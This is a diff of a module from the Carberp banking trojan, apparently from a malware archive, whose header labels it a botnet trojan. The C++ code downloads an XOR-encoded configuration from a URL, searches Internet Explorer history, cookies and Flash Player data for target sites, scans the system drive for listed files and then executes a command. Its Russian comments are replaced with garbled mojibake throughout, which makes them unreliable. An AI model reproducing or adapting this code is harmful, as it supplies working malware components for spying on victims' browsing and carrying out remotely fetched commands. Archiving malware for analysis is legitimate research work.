@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 #include <windows.h>
@@ -19,7 +30,7 @@ const DWORD MaxSearchFromConfigFileseTime = 10*60*1009;
 //---------------------------------------------------------------------------
 bool CompareSites(PStrings S, PCHAR Site)
 {
-	// Сравнивает сайты из списка S с сайтом Site
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ S пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Site
 	DWORD Count = Strings::Count(S);
     PCHAR Line;
 	for (DWORD i = 0; i < Count; i++)
@@ -58,10 +69,10 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 
 	bool Result = false;
 
-    // Копируем файл
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	pCopyFileA(FileName, FileCopy, FALSE);
 
-    // Читаем файл в буффер
+    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	HANDLE File = (HANDLE)pCreateFileA(FileCopy,
                             GENERIC_READ,
 							FILE_SHARE_READ,
@@ -76,13 +87,13 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 		DWORD FileSize = (DWORD)pGetFileSize(File, H);
 		if (FileSize > 0)
 		{
-			// Мапируем файл в память
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
         	HANDLE MapFile = (HANDLE)pCreateFileMappingW(File, 0, PAGE_READONLY, 0, FileSize, 0 );
 			if (MapFile != INVALID_HANDLE_VALUE)
 			{
 				PCHAR Buffer  = (PCHAR)pMapViewOfFile(MapFile, FILE_MAP_READ, 0, 0, 0 );
 
-				// Ищем совпадения
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				DWORD Count = Strings::Count(S);
 				PCHAR Line;
 				for (DWORD i = 0; i < Count; i++)
@@ -114,7 +125,7 @@ bool ReadIEHistoryFile(PCHAR FileName, PStrings S)
 
 void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 {
-	// Функйия обратной связи поиска файлов и директории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = (PHistoryConfig)Data;
 
 	if (ReadIEHistoryFile(FileName, Config->Sites))
@@ -127,19 +138,19 @@ void SearchIEHistoryCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &
 
 bool SearchInIEHistory(PHistoryConfig Config)
 {
-	// Ищем совпадения в кукисахIE
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_HISTORY, false))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	StrConcat(Path, "\\");
 	SearchFiles(Path, "*.dat", true, FA_ANY_FILES, Config, SearchIEHistoryCallBack);
 
@@ -153,7 +164,7 @@ bool SearchInIEHistory(PHistoryConfig Config)
 
 void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 {
-	// Функйия обратной связи поиска файлов и директории
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = (PHistoryConfig)Data;
 	if (CompareSites(Config->Sites, Find->cFileName))
 	{
@@ -166,19 +177,19 @@ void SearchCallBack(PFindData Find, PCHAR FileName, LPVOID Data, bool &Cancel)
 
 bool SearchInIECookies(PHistoryConfig Config)
 {
-	// Ищем совпадения в кукисахIE
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_COOKIES, false))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	StrConcat(Path, "\\");
 	SearchFiles(Path, "*.txt", false, FA_ANY_FILES, Config, SearchCallBack);
 	//
@@ -189,19 +200,19 @@ bool SearchInIECookies(PHistoryConfig Config)
 //---------------------------------------------------------------------------
 bool SearchFlashPlayerCookies(PHistoryConfig Config)
 {
-    // Ищем совпадения в кукисахIE
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅIE
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL)
 		return false;
 
-    // Определяем путь к директории пользователя
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, false))
 	{
 		STR::Free(Path);
 		return false;
 	}
 
-	// Ищем файлы
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	SearchFiles(Path, "*.*", true, FA_DIRECTORY, Config, SearchCallBack);
 	//
 	STR::Free(Path);
@@ -210,7 +221,7 @@ bool SearchFlashPlayerCookies(PHistoryConfig Config)
 }
 
 //---------------------------------------------------------------------------
-//  HisUtils - Вспомогательнве утилиты анализатора истории
+//  HisUtils - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------------------------
 
 namespace HisUtils
@@ -219,7 +230,7 @@ namespace HisUtils
     //------------------------------------------------------------------------
 	void ExtractFileItems(PHistoryConfig Config)
 	{
-		// изылечь элементы поиска файлов из списка ссылок
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (Config == NULL || Config->Sites == NULL) return;
 		PCHAR S;
         PCHAR FileName;
@@ -229,15 +240,15 @@ namespace HisUtils
 		while (i < Strings::Count(Config->Sites))
 		{
 			S = Strings::GetItem(Config->Sites, i, false);
-			// проверяем начинается ли элемент с префикса элемента файла
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if (!StrSame(S, HisFileItem, false, Len))
 			{
-				// Элемент не является файлом, игнорируем его
+				// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 				i++;
 				continue;
 			}
 
-			// Элемент является файлом, извлекаем имя файла
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			FileName = STR::IgnoreSpaces(S + Len);
 			if (!StrIsEmpty(FileName))
 			{
@@ -252,11 +263,11 @@ namespace HisUtils
 
 	//------------------------------------------------------------------------
 
-	// Структура поиска файлов из конфига
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	typedef struct TFileSearch
 	{
-		// Стандартные пути поиска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PCHAR ProgramFiles;
 		PCHAR Windows;
 		PStrings AllPaths;
@@ -271,7 +282,7 @@ namespace HisUtils
 	//------------------------------------------------------------------------
 	PCHAR GetSpecPath(int CSIDL)
 	{
-		// Функция возвращает некторый путь
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		PCHAR Buf = STR::Alloc(MAX_PATH);
 		PCHAR Result = NULL;
 		if (pSHGetSpecialFolderPathA(NULL, Buf, CSIDL, false))
@@ -284,7 +295,7 @@ namespace HisUtils
 
 	void InitSearchCallBack(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
 	{
-		// Директория найдена, добавляем её в список
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = (PFileSearch)Data;
         Strings::Add(S->AllPaths, FileName);
     }
@@ -292,12 +303,12 @@ namespace HisUtils
 
 	PFileSearch StartSearch()
 	{
-		// Функция инициализирует поиск файлов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = CreateStruct(TFileSearch);
 		S->ProgramFiles = GetSpecPath(CSIDL_PROGRAM_FILES);
 		S->Windows = GetSpecPath(CSIDL_WINDOWS);
 
-		// Определяем корневые директории системмного диска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
         S->AllPaths = Strings::Create();
 		PCHAR Drive = STR::GetLeftStr(S->Windows, ":\\", true);
 		SearchFiles(Drive, "*.*", false, FA_DIRECTORY, S, InitSearchCallBack);
@@ -316,7 +327,7 @@ namespace HisUtils
 
 	void CloseSearch(PFileSearch S)
 	{
-		// Уничтожить данные поиска
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (S == NULL) return;
 		STR::Free(S->Windows);
 		STR::Free(S->ProgramFiles);
@@ -342,7 +353,7 @@ namespace HisUtils
 
 	bool RealSearchFile(PHistoryConfig Config, PFileSearch S, PCHAR Path)
 	{
-		// Функция ищет файл по маске Mask по пути Path
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Mask пїЅпїЅ пїЅпїЅпїЅпїЅ Path
 		if (S->Finded || S->TimeCompleted) return true;
 
 		DWORD Count = Strings::Count(Config->Files);
@@ -359,17 +370,17 @@ namespace HisUtils
 
 	bool SearchFilesFromConfig(PHistoryConfig Config)
 	{
-		// Функция ищет файлы указанные в конфигурационном файле
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-		// инициализируем поиск
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		PFileSearch S = StartSearch();
 
-		// Ищем файлы
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		RealSearchFile(Config, S, S->ProgramFiles);
 
 	  	if (!S->Finded  && !S->TimeCompleted)
 		{
-			// Ищем файлы во всех директориях системмного диска
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			for (DWORD i = 0; i < Strings::Count(S->AllPaths); i++)
 			{
 				RealSearchFile(Config, S, Strings::GetItem(S->AllPaths, i));
@@ -381,7 +392,7 @@ namespace HisUtils
 		if (!S->Finded && !S->TimeCompleted)
 			RealSearchFile(Config, S, S->Windows);
 
-		// Закрываем поиск
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		bool Result = S->Finded;
 		CloseSearch(S);
 		return Result;
@@ -393,17 +404,17 @@ namespace HisUtils
 //---------------------------------------------------------------------------
 bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 {
-	// Загрузить конфигурационный файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Config = NULL;
 	if (StrIsEmpty(URL)) return false;
 
-	// Загружаем конфиг в файл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ
 	LPBYTE Buffer = NULL;
 	DWORD BufSize = 0;
 	if (!DownloadInMem(URL, &Buffer, &BufSize))
 		return false;
 
-	// Расшифровываем конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char Signature[] = {'B', 'J', 'B', 0};
 	PCHAR Lines = (PCHAR)XORCrypt::DecodeBuffer((PCHAR)Signature, Buffer, BufSize);
 	if (Lines == NULL || BufSize == 0)
@@ -412,7 +423,7 @@ bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 		return false;
 	}
 
-	// Парсим конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	Config = CreateStruct(THistoryConfig);
     if (Config == NULL) return false;
 	bool Result = Parse(Lines, Config);
@@ -433,7 +444,7 @@ bool HisAnalizer::Download(PCHAR URL, PHistoryConfig &Config)
 
 bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 {
-	// Разобрать список строк конфигурационного файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (StrIsEmpty(Lines))
 		return false;
 
@@ -441,7 +452,7 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 	Strings::SetText(S, Lines);
 	bool Result = false;
 
-	// Парсим список
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Strings::Count(S) > 1)
 	{
 		PCHAR Cmd = Strings::GetItem(S, 0);
@@ -461,7 +472,7 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 
 	if (Result)
 	{
-		// Отделяем сайты от файлов
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Config->Sites = S;
         HisUtils::ExtractFileItems(Config);
     }
@@ -473,8 +484,8 @@ bool HisAnalizer::Parse(PCHAR Lines, PHistoryConfig Config)
 //---------------------------------------------------------------------------
 void HisAnalizer::Execute(PHistoryConfig Config)
 {
-	// Выполнить поиск по истории посещения сайтов
-	// и на этой основе выполнить необходимую команду
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Config == NULL) return;
 
 	bool Contain =  SearchInIEHistory(Config) ||
@@ -492,7 +503,7 @@ void HisAnalizer::Execute(PHistoryConfig Config)
 
 void HisAnalizer::DownloadAndExecute(PCHAR URL)
 {
-	//  Загрузить и выполнить команду из конфигурационного файла
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	PHistoryConfig Config = NULL;
 	if (Download(URL, Config))
 	{
@@ -516,7 +527,7 @@ void HisAnalizer::ClearConfig(PHistoryConfig Config)
 
 void HisAnalizer::FreeConfig(PHistoryConfig Config)
 {
-	// Уничтожить конфиг
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Config == NULL) return;
 	ClearConfig(Config);
 	FreeStruct(Config);
